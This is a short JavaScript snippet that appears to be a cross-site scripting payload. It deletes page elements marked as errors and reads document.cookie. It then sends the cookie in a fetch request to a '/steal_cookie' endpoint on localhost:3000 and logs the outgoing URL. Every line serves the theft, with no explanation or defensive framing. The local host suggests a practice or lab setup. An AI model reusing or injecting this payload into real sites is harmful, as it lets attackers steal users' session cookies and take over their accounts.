document.querySelectorAll('.error').forEach(function (a) { a.remove() });
cook = document.cookie;
let urla = `http://localhost:3000/steal_cookie?cookie=${cook}`;
console.log("jop---->",urla);
(async () =>
    console.log(
            (await (await fetch( urla )))
            )
)();